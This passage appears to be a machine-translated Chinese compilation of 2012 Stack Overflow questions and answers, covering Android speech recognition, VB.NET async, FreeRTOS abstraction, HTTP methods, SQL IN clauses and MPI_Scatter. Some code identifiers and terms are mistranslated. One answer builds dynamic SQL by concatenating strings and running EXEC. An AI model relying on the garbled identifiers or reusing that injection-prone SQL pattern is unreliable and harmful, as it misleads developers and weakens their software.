因此，您想使用[Android 语音识别 API](http://developer.android.com/reference/android/speech/package-summary.html)来获取用户所说内容的转录和音频。我知道的唯一解决方案是使用`SpeechRecognizer`-class。这允许您与安装在系统上的语音识别器进行交互，但您必须自己实现 UI（麦克风按钮、错误消息显示等）。所以它比使用 plain 多一点工作`RecognizerIntent.ACTION_RECOGNIZE_SPEECH`。您的案例中的相关类/方法是：

*   [语音识别器](http://developer.android.com/reference/android/speech/SpeechRecognizer.html)
    *   void setRecognitionListener(RecognitionListener 监听器)
*   [识别监听器](http://developer.android.com/reference/android/speech/RecognitionListener.html)
    *   无效 onBufferReceived（字节 [] 缓冲区）

请注意，最后一个方法的文档包括*不保证会调用此方法*，因此语音识别 API 并非真正设计为允许音频捕获。它还说*采样率取决于实现。*，即您甚至不知道如何播放音频（或将其保存为 wav）。

另请参阅答案[https://stackoverflow.com/a/10918416/12547](https://stackoverflow.com/a/10918416/12547)

总结一下：

*   Android 语音识别 API*不*返回 MP3
*   Android 语音识别 API*不会*在 SD 卡上写入任何内容
*   Android 语音识别 API 包含一个以字节数组形式返回音频的方法，但您不能依赖每个语音识别应用程序来实现此方法

# vb.net - 使用 async-await 递增

> ID：13217103
> 
> 赞同：2
> 
> 时间：2012-11-04T08:14:58.827
> 
> 标签：vb.net, async-await

我在 VS2012 中使用 Async-Await 并尝试在使用多个线程时增加一个值。

我知道我可以使用 Interlocked.Increment 使 i += 1 线程安全或使用同步锁。

这给了我这个代码。

```
 Imports System.Threading

Module Module1

    Private incre As New Incrementing

    Sub Main()
        Console.WriteLine("Starting")
        Const numberofthreads As Integer = 20
        Dim ts(numberofthreads) As Task(Of Integer)
        For i = 0 To numberofthreads
            ts(i) = count()
        Next
        Task.WaitAll(ts)
        For i = 0 To numberofthreads
            Console.WriteLine(ts(i).Result)
        Next
        Console.ReadLine()
    End Sub

    Async Function count() As Task(Of Integer)
        Await Task.Run(Sub()
                           For i = 1 To 1000
                               incre.Add()
                               Thread.Sleep(1)
                           Next
                       End Sub)
        Return incre.Read()
    End Function

    Public Class Incrementing
        Private i As Integer = 0

        Public Sub Add()
            Interlocked.Increment(i)
        End Sub

        Public Function Read() As Integer
            Return i
        End Function
    End Class
End Module 
```

但它看起来不是很漂亮，Task.Run 对一个人来说似乎很奇怪。有没有更好的方法来做到这一点？

在我看来，螺纹方式不那么笨拙。

```
Imports System.Threading

Module Module1

    Private incre As New Incrementing

    Sub Main()
        For i = 0 To 20
            Dim t1 As New Thread(AddressOf count)
            t1.IsBackground = True
            t1.Start()
        Next
        Console.ReadLine()
    End Sub

    Sub count()
        For i = 1 To 1000
            incre.Add()
            Thread.Sleep(1)
        Next
        Console.WriteLine(incre.Read())
    End Sub

    Public Class Incrementing
        Private i As Integer = 0

        Public Sub Add()
            Interlocked.Increment(i)
        End Sub

        Public Function Read() As Integer
            Return i
        End Function
    End Class
End Module 
```

# iphone - 暂停转换和恢复

> ID：13217108
> 
> 赞同：0
> 
> 时间：2012-11-04T08:15:44.563
> 
> 标签：iphone, objective-c, ios, catransition

我使用下面的代码进行转换

```
CATransition *transition = [CATransition animation];
transition.duration = duration ;
transition.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];

transition.type = kCATransitionMoveIn;

transitioning = YES;
transition.delegate = self;

[self.view.layer addAnimation:transition forKey:nil];

fromUIView.hidden = YES;
toUIView.hidden = NO;

UIImageView *tmp = toUIView;
toUIView = fromUIView;
toUIView = tmp; 
```

但我希望在过渡进度 0.3 处暂停做某事，然后继续过渡到进度 0.6 做某事并继续。是否可以 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:28:16.197

我以前从未使用`CATransition`过，但我认为您可以使用`NSTimer`,`GCD`或`performSelector:withObject:afterDelay:`.

例如：

```
double delayInSeconds = 0.3;
dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
    [self doSomething];
}); 
```

`doSomething`在哪里

```
-(void)doSomething{
    [self pauseLayer:thisLayer];
    //do something
    [self resumeLayer:thisLayer];
} 
```

# java - 使用jxl将具有格式的数据从一个excel复制到另一个

> ID：13217109
> 
> 赞同：1
> 
> 时间：2012-11-04T08:15:50.210
> 
> 标签：java, excel, jxl

我尝试将数据从一个 Excel 工作表复制到另一个工作表，但我的数据正在被修剪，并且格式与复制的不同。我需要复制确切的格式，因为我必须重用单元格内容才能插入 DB。

要复制的代码如下所示：

```
String cell = excelSheet.getCell(col, r).getContents().trim(); 
```

如何复制保持原始单元格格式的单元格？

# android - getSupportLoaderManager() 在不同的片段中使用相同的 id？

> ID：13217111
> 
> 赞同：8
> 
> 时间：2012-11-04T08:16:19.743
> 
> 标签：android, android-listfragment, android-loadermanager, android-cursor, android-support-library

我正在一个带有多个 ListFragment 的 FragmentActivity 中创建一个 viewPager。为了填充不同的列表视图，我得到了 LoaderManager 并在加载器中初始化。我想为每个片段都有一个唯一的 LoaderManager，但是，片段没有 getSupportLoaderManager() 方法，所以我需要调用父片段活动：

```
getActivity().getSupportLoaderManager() 
```

这种方法的问题是我的加载器在不同的片段中标识相互冲突。当您在一个片段中已经有多个加载程序 id 时，它会变得有点麻烦。那么有没有办法为每个片段获取一个唯一的 LoaderManager，而不是调用父片段？我基本上希望能够在多个片段上使用相同的 id。

谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-04T15:59:32.857

是的，您可以使用：[android.support.v4.app.Fragment.getLoaderManager()](http://developer.android.com/reference/android/support/v4/app/Fragment.html#getLoaderManager%28%29) 为每个 Fragment 获取一个唯一的，这意味着您可以从零开始您的 id。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-04T23:58:48.707

评论太长了，但我会在您的问题评论中继续我们的讨论。

你应该反其道而行之：接受 ID 是活动本地的事实，而不是片段的本地。

是的，片段和活动之间的耦合很差。大多数情况下，来自片段的回调将片段链接到一个活动（即使使用接口也不是那么干净），并且为了将参数从活动传递给片段：您必须使用静态工厂方法来构建片段并设置其参数通过 setArgs。

您的问题完全是关于这样一个耦合问题：活动的每个片段中的加载程序 ID 不应与所有其他片段使用的 ID 重叠。这也是一个耦合约束，因为我们对位于活动级别的片段有一个约束。你是对的，Android 可以通过在片段本地引入加载器来解决片段级别的问题。

然而，可能有一些优雅的方法来解决这个问题并保留一个相对的解耦方案。例如，您可以创建一个 ID 工厂，为片段内的加载程序生成“好”ID 并防止重叠（id++ 将是完美的）：

```
public interface IdFactory {
   public int createId();
} 
```

然后在每个片段中，当你需要一个加载器时：

```
this.newLoaderId = idFactory.createId(); 
```

工厂可以使用以下三种策略之一由所有片段共享：

*   单身人士。每个片段将通过以下方式访问 IdFactory

    IdFactory idFactory = DefaultIdFactory.getInstance();

*   创建一个实现 IdFactory 的类的单个实例，将该类的该实例作为应用程序类中的数据字段，并为其提供一个 getter。每个片段都可以使用

    IdFactory idFactory = ((MyApplication)getActivity().getApplicationContext() ).getIdFactory();

*   在活动级别创建您的工厂。活动可以实现 IdFactory 接口，或者它们可以提供一个内部类来实现它。然后每个片段将使用以下命令访问工厂：

    IdFactory idFactory = getActivity().getIdFactory(); //或IdFactory idFactory = (IdFactory)getActivity();

第三种选择更好，因为它将遵循您的确切需求并遵循活动生命周期，允许您的工厂被垃圾收集。

还有其他选项，例如使用 RoboGuice 或 Dagger 或任何其他依赖注入框架，但这不是标准的。

# node.js - 如何在 node.js 中访问共享网络驱动器

> ID：13217114
> 
> 赞同：6
> 
> 时间：2012-11-04T08:17:10.180
> 
> 标签：node.js, iis

在 IIS 中，我有一个在应用程序池下运行的 Web 服务，该应用程序池具有可以访问远程计算机上的驱动器的用户身份。这样，当 Web 服务运行并尝试访问远程计算机以读取文件时，我们不会收到任何无效授权错误。

我现在已经编写了我的第一个 Node.js 应用程序，但我不确定如何允许从应用程序访问远程计算机的文件流。我有我想要读取的远程计算机文件的 unc 路径名，但我不确定是否必须传递用户的凭据才能访问该文件，或者我必须在某些凭据下运行 Node.js 应用程序。

有什么线索吗？

我知道 IIS 有节点，但是在没有 IIS 的情况下还有另一种方法。

**更新：**

只需在我的用户帐户下运行我的应用程序，并且该帐户配置为允许访问远程计算机，并且我可以访问远程计算机而无需更改我的代码（换句话说，只是直接使用 Unc 路径）。但是，如何使用其他用户的凭据（即在 Node.js 中模拟？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T20:45:10.167

Node 不像 .NET 应用程序那样处理模拟，因为 NodeJS 不是 Windows 特定的，所以它不知道 Windows 处理权限和提升的方式。

但这不是问题。我在大型金融网络上使用了以下技术。

正如您自己指出的那样，最好的解决方案是为您的 nodeJS 应用程序拥有一个专用的用户帐户，该帐户具有足够的权限来访问 UNC，但没有其他权限。然后，当您运行应用程序时，以该用户身份运行它。

让我建议您设置一个服务来运行 nodejs 应用程序并在服务中指定用户帐户。这使它更容易和更安全。如果您的应用程序被黑客入侵，黑客将无法逃脱帐户的限制。

# http - HTTP 方法：DELETE 与 POST

> ID：13217115
> 
> 赞同：8
> 
> 时间：2012-11-04T08:17:21.383
> 
> 标签：http

假设我有一个名为“Session”的资源。客户端将调用 PUT 来创建并开始一个新会话。当客户端完成会话时，它应该不再可访问，但由于历史/责任原因应该持续存在。

要结束会话，是否更适合发出 DELETE 请求，这在语义上看起来更接近预期效果，或者 POST，因为资源实际上并没有被永久删除？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-04T08:27:00.697

这里的问题是：请求是[幂等](https://en.wikipedia.org/wiki/Idempotence#Examples)的吗？如果两次执行相同的请求，是否有副作用？就像您订购文章一样，执行两次订购请求将使您获得两次文章。

在那种情况下，`POST`是你想要的方法。如果没有，那么您想要`PUT`or `DELETE`。

由于您似乎没有删除会话，仅更改其状态`PUT`将是更好的方法，因为这意味着资源已更改，而不是被删除，这就是您的情况。

*编辑：*

如果资源似乎从客户端删除，`DELETE`似乎更合适。后面的事情如何实现对客户来说并不重要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:21:55.920

POST 请求在这里会更好，因为您实际上并没有删除`session`. POST 请求通常用于更改对象的状态。我认为这是你的情况。

# sql - SQL 查询的 IN 子句中的逗号分隔字符串

> ID：13217122
> 
> 赞同：0
> 
> 时间：2012-11-04T08:18:52.407
> 
> 标签：sql, sql-server-2008

> **可能重复：**
> [如何在 oracle sql 的 WHERE IN 子句中传递变量？](https://stackoverflow.com/questions/4462415/how-to-pass-a-variable-in-where-in-clause-of-oracle-sql)

`Prefix`我的表中有一个列，`Tbl_Prefix`其值为用逗号分隔的字符串，如下所示：

```
'aaa','bbb','ccc' 
```

我有一个`Tbl_Employee`这样的员工表：

```
Empno Prefix
------------
1000  aaa
2000  eee
3000  ccc
4000  aaa
5000  ddd 
```

我需要在此查询的子句`IN`部分中使用此前缀：`WHERE`

```
Select * 
from Tbl_Employee  
where Tbl_Employee.Prefix  in (select  Tbl_Prefix.prefix 
                               from Tbl_Prefix 
                               where Tbl_Prefix.flag = 'y') 
```

内部选择查询`select Tbl_Prefix.prefix from Tbl_Prefix where Tbl_Prefix.flag='y'`有结果`'aaa','bbb','ccc'`

如何在 'IN' 子句中使用此字符串，以便获得正确的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:27:14.840

首先，不要那样做。创建一个数据桶/链接表，并将aaa、bbb和ccc链接到其相关关系。

但是，如果您必须这样做（如果可能，请更改它！），您必须创建一个动态 SQL 字符串并执行它。因此，从 select 到 where 构建字符串并附加“Prefix”分隔字符串，然后调用`EXEC`.

因此，您将设置：

`@sql = 'SELECT YOURSTUFF FROM YOURTABLE WHERE YOURCOLUMN IN ' + @prefix.` `@prefix`应该是您需要的 tbl_Prefix 中的列值 (aaa,bbb,ccc)。

一旦你的字符串被构建，`EXEC @sql`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:30:30.707

如果这些值像这样存储在您的数据库中，您应该认真重新考虑您的数据库设计。创建一个子表，其中包含每个父记录的每个逗号分隔值的记录。

目前，您可以使用`EXISTS`and `LIKE`，但如果您有很多记录，此查询很快就会变慢。

```
select 
  * 
from 
  Tbl_Employee e
where 
  exists  
    (select * from 
       Tbl_Prefix x
    where
       x.flag = 'y' and
       x.prefix like '%''' + e.prefix + '''%') 
       -- Add quotes to prevent false matches 
```

# javascript - 添加一个全局事件监听器，它总是使用 Jquery/JS 监听服务器调用

> ID：13217124
> 
> 赞同：0
> 
> 时间：2012-11-04T08:19:32.020
> 
> 标签：javascript, jquery

如何设置一个持续监听服务器调用的全局事件监听器。这些服务器调用将是与另一个用户建立会话的请求。我可以举出的最好的例子来说明我的观点，就像Skype一样，每当有人登录时，该用户都有一个事件监听器，它监听其他用户可能想要对该用户进行的任何呼叫。那么我可以在jquery中使用像live或delegate函数这样的东西吗，或者你有什么其他的建议。如果您能指引我正确的方向，我将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T21:44:20.807

经过大量研究，这是我发现并且完美运行的：

[http://www.html5rocks.com/en/tutorials/eventsource/basics/](http://www.html5rocks.com/en/tutorials/eventsource/basics/)

HTML5 摇滚！！！！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-05T06:12:20.370

我还找到了一个替代方案，我使用工人并与他们一起打开一个 websocket。我不知道这个解决方案的可扩展性如何，但仍然如此。

[http://www.html5rocks.com/en/tutorials/workers/basics/](http://www.html5rocks.com/en/tutorials/workers/basics/)

# android - 服务通过 Activity 显示 Allow/Deny AlertDialog。如何让用户的选择重新投入使用？

> ID：13217126
> 
> 赞同：2
> 
> 时间：2012-11-04T08:20:02.957
> 
> 标签：android

我有一个后台服务正在运行，需要向用户显示允许/拒绝 AlertDialog 并让他选择。大致来说，这就是我想要的。在我的服务中，我有这样的代码：

```
void someMethod()
{
    boolean allow = showAllowDenyBox();
    //Some operations based on the value of allow
} 
```

我想知道如何实现方法 showAllowDenyBox()。从[这个](https://stackoverflow.com/questions/3814126/display-alertdialog-as-system-overlay-window-from-service)线程中，我了解到我必须创建一个 Activity 并在该 Activity 中显示 AlertDialog。但是，一旦用户选择允许或拒绝，我将如何将该选择报告给服务？对此的任何帮助将不胜感激。

简而言之，我希望从服务内部生成一个 AlertDialog 并且它必须是同步的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T08:42:55.750

您必须使用[startActivityForResult](http://developer.android.com/reference/android/app/Activity.html#startActivityForResult%28android.content.Intent,%20int%29)方法来实现此功能。有关返回结果的更多信息，请查看[此 SO 帖子](https://stackoverflow.com/questions/2497205/how-to-return-a-result-startactivityforresult-from-a-tabhost-activity)。

基本上使用此方法，您会通知 Android 系统您希望从传递给此方法的活动中获取结果。在上面的帖子中很好地解释了设置该结果。一定要检查一下。

# jquery - 简单的自定义 jquery 灯箱 - 在前后切换放大的图像

> ID：13217131
> 
> 赞同：1
> 
> 时间：2012-11-04T08:21:01.493
> 
> 标签：jquery, image, toggle

`.show()`每当我点击产品链接的“缩放”按钮时，我没有看到任何理由不制作自己的 div，而不是使用所有这些灯箱 jquery 插件。（每个产品链接及其缩放按钮都是从数据库中动态加载的）。

因此，我的网站用户只需单击缩放，就会弹出产品正面的特写图像。问题是我还希望用户能够“翻转”并查看产品的背面。（在此过程中，我只是更改了图像的 src `$('#closeup')`。但这里有一个问题。第一次翻转通常很好......对于之后放大的每个连续产品，翻转似乎增加了！

所以，第一个产品，用户点击“翻转”：1 从前到后翻转。好的。第二个产品，用户点击“翻转”：1个从前到后翻转，另一个从后到前翻转，所以用户回到了前面的图像！第三个产品，用户点击“翻转”，3次翻转！这是怎么回事？

我试过`event.stopPropagation()`了，但没有什么不同。

我的代码如下：

```
$('.zoom').live('click', function(e){
    paths = $(this).attr('data-title').split(";"); // data-title is in the "form front_path;back_path"
            // paths[0] now holds path to front image, paths[1] holds path to back image
    $('#closeup').attr('src',paths[0]);

            $('.flipview').click(function(e){
            if($('#closeup').attr('src')==paths[0]){
                       e.stopPropagation() ; 
                       alert('switching from front  '+$('#closeup').attr('src')+' - to back'); 
                       $('#closeup').attr('src', paths[1]);
                    }else{
                       e.stopPropagation(); 
                       alert('switching from back '+$('#closeup').attr('src')+' to front'); 
                       $('#closeup').attr('src', paths[0]) 
                   }
        });
}); 
```

因此，本质上，每当放大产品时，`.flipview`该类都会获得分配给它的新自定义操作。

从数据库中为单个产品加载的 HTML 是：

```
<li> <img src="../designs_staff/product0/template0/s16_1350300633/0.jpg">
     <a id="s16_1350300633" class="zoom" title="Zoom in" data-title="../designs_staff/product0/template0/s16_1350300633/0.jpg;../designs_staff/product0/template0/s16_1350300633/1.jpg" href="#">  </a>
</li> 
```

以及与产品特写一起弹出的 DIV 的 HTML：

```
<div id='popup'>
<a href='#' class='flipview'>Flip</a> | <a href='#' id='closepopup'>Close</a>
<br /><img id='closeup' />
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T12:23:57.760

好的，我明白了。问题是有许多产品可以放大，但所有产品都使用一个弹出窗口。因此，对于每个放大的按钮，都附加了一个新的点击功能`$('.flipview')`。因此，每次缩放都会为每次翻转增加一个切换。

修复只是在切换图像源之前删除现有的单击事件处理程序：

```
 $('.flipview').unbind('click'); 
```

# c - 如何在使用 FreeRTOS 时保持代码可移植性

> ID：13217134
> 
> 赞同：3
> 
> 时间：2012-11-04T08:21:51.473
> 
> 标签：c, embedded, portability, freertos

我对如何在我的应用程序中使用 FreeRTOS 感到困惑。让我提出一个简单的场景。假设我有 main 和一个具有一些硬件特定代码的模块。该代码可以用于控制系统或传感器中的特定电机......具有定义角色的任何硬件。在 module.c 我有一个名为`ModuleNameTask`. 在`main`我使用创建任务`xTaskCreate`并通过`ModuleNameTask`. 由于 my`ModuleNameTask`是在 module.c 而不是 main.c 中定义的，因此我现在必须在 module.c 中包含一些 FreeRTOS 才能使用`vTaskDelay`. 我不喜欢将这些文件包含在 module.c 中的事实，因为我觉得它不再可移植。

那么，我该如何处理呢？我应该`ModuleNameTask`从 module.c 中删除它并将其放在 main.c 中吗？或者只是接受我必须在 module.c 中包含一些 FreeRTOS 的事实。有什么建议吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-04T08:45:01.340

您*需要*FreeRTOS 提供哪些功能才能使您的模块正常工作。显然有一些东西，或者你不需要包含标题，你也不会调用函数。

获取这些函数并将它们放在一个单独的头文件中，并将它们`os/<operating_sys>/freertos.h`包装在您自己的函数名称中（例如`my_createtask(<args>)`.）。现在要移植到不同的操作系统，您需要为您自己的功能提供一个带有新包装器的新文件。

如果你做得不好，你会注意到你的 createtask 函数看起来与 FreeRTOS 函数完全一样，并且可以很容易地映射，但是当你想使用 linux/vxWorks/其他操作系统时，该函数没有正确的参数。

您的 createtask 函数应该只包含您关心的参数。其他的应该在包装器中硬编码。这将使移植更容易（您将拥有与其他操作系统中的硬编码不同的参数）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-04T09:06:04.020

抽象 RTOS 和设备层。

定义您设计的操作系统接口（这可能只是 FreeRTOS 功能的子集，甚至包括使用 RTOS 原语实现的更高级别的接口）并使用 FreeRTOS 实现此接口。

*然后，您只*使用您的 RTOS 抽象层接口定义您的整个应用程序，包括您的设备层。当您将应用程序移植到另一个平台或 RTOS 时，您只需要更改抽象层实现，并确保保持与原始实现相同的语义。如果设备层也被适当地抽象为能够在不同硬件之间通用，那么您可以对硬件依赖项做同样的事情（即从物理实现中抽象它们）。

多年来，我已成功使用这种方法，使用 C++ 中的 RTOS 抽象，我已将其移植到 FreeRTOS、VxWorks、Segger embOS 和 Keil RTX，甚至 Windows 和 Linux（用于测试和模拟）。您当然不需要使用 C++，但它非常适合这项任务。

在您的抽象中，您需要考虑以下内容：

*   穿线
*   IPC（队列、管道、事件标志、邮箱等）
*   同步（互斥量、信号量）
*   计时器
*   中断处理程序

您的界面可能看起来与 FreeRTOS 本身非常不同，可能值得查看许多其他 RTOS 界面，以了解您可能需要什么样的功能。

# c# - 在浏览器中打开多个选项卡

> ID：13217136
> 
> 赞同：0
> 
> 时间：2012-11-04T08:22:14.330
> 
> 标签：c#, asp.net

我想从 c# 代码打开 10 个浏览器选项卡，我该怎么做？

```
protected void Page_Load(object sender, EventArgs e)
{
    foreach (var url in Getdata())
    {
        string URL = string.Format("http://www.websitename.com/member_id={0}", url.Replace("Member", ""));
        Response.Redirect(URL);
    }
}

public List<string> Getdata()
{
    List<string> Key = new List<string>();
    Key.Add("Member2942048");
    Key.Add("Member3271434");
    Key.Add("Member3271124");
    return Key;
} 
```

还建议如何为此编写jQuery / Javascript代码（我可以在jQuery中创建arraylist并一一阅读）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T08:27:04.863

这将完成这项工作：

```
 /// <summary>
    /// Opens new window
    /// </summary>
    /// <param name="page"></param>
    /// <param name="fullUrl"></param>
    public static void OpenNewWindow(System.Web.UI.Page page, string fullUrl, string key)
    {
        string script = "window.open('" + fullUrl + "', '" + key + "', 'status=1,location=1,menubar=1,resizable=1,toolbar=1,scrollbars=1,titlebar=1');";
        page.ClientScript.RegisterClientScriptBlock(page.GetType(), key, script, true);
    } 
```

在您当前的页面中，您应该调用如下内容：

```
OpenNewWindow(this,"http://someServer/somePage.aspx","key"); 
```

确保您的页面包含 ScriptManager 并且每次调用时键都是唯一的！

所以在你的代码中：

```
int i=0;
string key = "Opener";
foreach (var url in Getdata())
{
     i +=1;
     string URL = string.Format("http://www.websitename.com/member_id={0}", url.Replace("Member", ""));
     OpenNewWindow(this,URL , key + i.ToString());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:28:01.427

您不能从服务器端代码执行此操作。您可以做的是给客户端一个要打开的 url 列表，然后让客户端为每个 url 打开新窗口。这可能有点棘手，因为我的浏览器将您阻止为 Windows 垃圾邮件发送者。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-04T08:29:41.483

您可以使用`Process.Start(websiteUrl );`

```
Process BrowserProcess = new Process(); 
```

像这样：

```
ProcessStartInfo psiOjbect = new ProcessStartInfo("http://DefaultWebsiteOfmyCompany.com"); // You can also use "about:blank".

            BrowserProcess.StartInfo = psiOjbect;
            BrowserProcess.Start();
            Thread.Sleep(1000); //Need to wait 

            foreach (string websiteUrl in Properties.Settings.Default.WebSiteURLs)
            {
                Process.Start(websiteUrl );
            } 
```

# c# - 在面板上绘制文本

> ID：13217138
> 
> 赞同：3
> 
> 时间：2012-11-04T08:22:44.450
> 
> 标签：c#, winforms, text, panel, onpaint

好的，我解决了所有问题，现在正是我想要的。我有一个`textBox1`，，`panel1`和`drawTexta`（一个按钮）。

当我单击按钮并在面板中选择一个点时，我想从`textBox1`.

```
private void panel1_Paint(object sender, PaintEventArgs e)
{
    using (SolidBrush br = new SolidBrush(Color.Red))
    {
        StringFormat sf = new StringFormat();
        sf.FormatFlags = StringFormatFlags.DirectionRightToLeft;
        e.Graphics.DrawString(textBox1.Text, this.Font, br, point1, sf);
    }
}

private void panel1_MouseDown(object sender, MouseEventArgs e)
{
    point1 = new Point(e.X, e.Y);
} 

bool flag = false;
Point point1 = new Point();

private void drawTexta_Click(object sender, EventArgs e)
{ 
    flag = true;
    panel1.Refresh();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:29:48.563

文本没有被绘制，`panel1`因为您需要刷新它。

将此代码添加到`button1_Click`，设置`drawText`为`true`：

```
panel1.Refresh(); 
```

这将使静态文本显示出来。

# json - 如何显示以 JSON 格式返回的图像

> ID：13217148
> 
> 赞同：0
> 
> 时间：2012-11-04T08:25:27.393
> 
> 标签：json

我想调用一个以 JSON 格式返回图像的 Web 服务。但我不知道如何在 HTMl 页面中将返回的 JSON 显示为图像。？

最好的祝福

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:28:34.680

您的问题遗漏了一些非常重要的细节，但假设返回的 JSON 有一个字符串是 base64 编码的图像，您可以将该字符串用作[`data`URI](http://en.wikipedia.org/wiki/Data_URI_scheme)的内容作为元素`src`的`img`内容（假设[兼容的浏览器](http://caniuse.com/#feat=datauri)）。更多关于在[此处](http://css-tricks.com/data-uris/)`data`使用URI 作为图像的信息。

例子：

```
var img = document.createElement('img');
img.src = "data:image/gif;base64," + dataFromServer.theImage;
document.body.appendChild(img); 
```

[实时复制](http://jsbin.com/ixaten/1)| [来源](http://jsbin.com/ixaten/1/edit)

当然，如果 JSON 包含指向图像的*链接*，您只需直接使用该链接`src`而不是使用`data`URI。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T08:31:56.603

您是否在问以下问题：

```
$.getJSON("http://api.flickr.com/services/feeds/photos_public.gne?jsoncallback=?",
  {
    tags: "gulmarg",
    tagmode: "any",
    format: "json"
  },
  function(data) {
    $.each(data.items, function(i,item){
      $("<img/>").attr("src", item.media.m).appendTo("#images");
      if ( i == 5 ) return false;
    });
  }); 
```

[**演示**](http://jsfiddle.net/refhat/naZFw/6/)

# c++ - 简单的 MPI_Scatter 尝试

> ID：13217149
> 
> 赞同：2
> 
> 时间：2012-11-04T08:25:47.943
> 
> 标签：c++, mpi

我只是在学习 OpenMPI。尝试了一个简单的`MPI_Scatter`例子：

```
#include <mpi.h>

using namespace std;

int main() {
    int numProcs, rank;

    MPI_Init(NULL, NULL);
    MPI_Comm_size(MPI_COMM_WORLD, &numProcs);
    MPI_Comm_rank(MPI_COMM_WORLD, &rank);

    int* data;
    int num;

    data = new int[5];
    data[0] = 0;
    data[1] = 1;
    data[2] = 2;
    data[3] = 3;
    data[4] = 4;
    MPI_Scatter(data, 5, MPI_INT, &num, 5, MPI_INT, 0, MPI_COMM_WORLD);
    cout << rank << " recieved " << num << endl; 

    MPI_Finalize();
    return 0;
} 
```

但它并没有按预期工作......

我期待类似的东西

```
0 received 0
1 received 1 
2 received 2 ... 
```

但我得到的是

```
32609 received 
1761637486 received 
1 received 
33 received 
1601007716 received 
```

奇怪的排名是怎么回事？似乎和我的分散有关？另外，为什么`sendcount`和`recvcount`一样？起初我想既然我将 5 个元素分散到 5 个处理器，每个处理器会得到 1 个？所以我应该使用：

```
MPI_Scatter(data, 5, MPI_INT, &num, 1, MPI_INT, 0, MPI_COMM_WORLD); 
```

但这给出了一个错误：

```
[JM:2861] *** An error occurred in MPI_Scatter
[JM:2861] *** on communicator MPI_COMM_WORLD
[JM:2861] *** MPI_ERR_TRUNCATE: message truncated
[JM:2861] *** MPI_ERRORS_ARE_FATAL: your MPI job will now abort 
```

我想知道，为什么我需要区分根进程和子进程？似乎在这种情况下，源/根也会得到一个副本？另一件事是其他进程也会分散运行吗？可能不是，但为什么呢？我认为所有进程都会运行此代码，因为如果我在 MPI 程序中看到它不是典型的？

```
if (rank == xxx) { 
```

**更新**

我注意到运行，发送和接收缓冲区的长度必须相同......并且数据应该声明为：

```
int data[5][5] = { {0}, {5}, {10}, {3}, {4} }; 
```

注意列被声明为长度 5 但我只初始化了 1 个值？这里实际发生了什么？这段代码正确吗？假设我只希望每个进程只接收 1 个值。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-05T03:10:42.940

`sendcount`是要发送到**每个**进程的元素数，而不是发送缓冲区中的元素数。`MPI_Scatter`只会`sendcount`从根进程的发送缓冲区中获取 * [通信器中的进程数] 元素，并将其分散到通信器中的所有进程。

因此，要将 1 个元素发送到通信器中的每个进程（假设有 5 个进程），请将`sendcount`和设置`recvcount`为 1。

```
MPI_Scatter(data, 1, MPI_INT, &num, 1, MPI_INT, 0, MPI_COMM_WORLD); 
```

可能的数据类型对存在限制，它们与点对点操作相同。的类型映射`recvtype`应该与 的类型映射兼容`sendtype`，即它们应该具有相同的基础基本数据类型列表。此外，接收缓冲区应该足够大以容纳接收到的消息（它可能更大，但不能更小）。在最简单的情况下，发送端和接收端的数据类型是相同的。所以`sendcount`- `recvcount`pair 和`sendtype`- `recvtype`pair 通常最终是一样的。他们可以不同的一个例子是当一个人在任一侧使用用户定义的数据类型时：

```
MPI_Datatype vec5int;

MPI_Type_contiguous(5, MPI_INT, &vec5int);
MPI_Type_commit(&vec5int);

MPI_Scatter(data, 5, MPI_INT, local_data, 1, vec5int, 0, MPI_COMM_WORLD); 
```

这是因为发送者构造了 5 个类型元素的消息，`MPI_INT`而每个接收者将消息解释为 5 元素整数向量的单个实例。

（请注意，您指定要接收的最大元素数量，`MPI_Recv`实际接收的数量可能会更少，可以通过 获得`MPI_Get_count`。相反，您提供要接收的预期元素数量，`recvcount`因此`MPI_Scatter`如果出现错误，则会引发错误收到的消息长度与承诺的不*完全相同。）*

可能您现在知道打印出的奇怪排名是由堆栈损坏引起的，因为`num`can 仅包含 1`int`但 5`int`被接收到`MPI_Scatter`.

> 我想知道，为什么我需要区分根进程和子进程？似乎在这种情况下，源/根也会得到一个副本？另一件事是其他进程也会分散运行吗？可能不是，但为什么呢？我认为所有进程都会运行此代码，因为如果我在 MPI 程序中看到它不是典型的？

在 Scatter 和 Gather 等一些操作中，有必要区分 root 和通信器中的其他进程（它们不是 root 的子进程，因为它们可以在单独的计算机中），因为这些是集体通信（组通信），但具有单一来源/目的地。因此，单个源/目标（奇数输出）称为根。所有进程都必须知道源/目标（根进程）才能正确设置发送和接收。

根进程，在 Scatter 的情况下，也将接收一条数据（来自它自己），在 Gather 的情况下，也将其数据包含在最终结果中。根进程也不例外，除非使用“就地”操作。这也适用于所有集体通信功能。

还有一些无根的全局通信操作，例如`MPI_Allgather`，其中不提供根等级。相反，所有等级都会收到正在收集的数据。

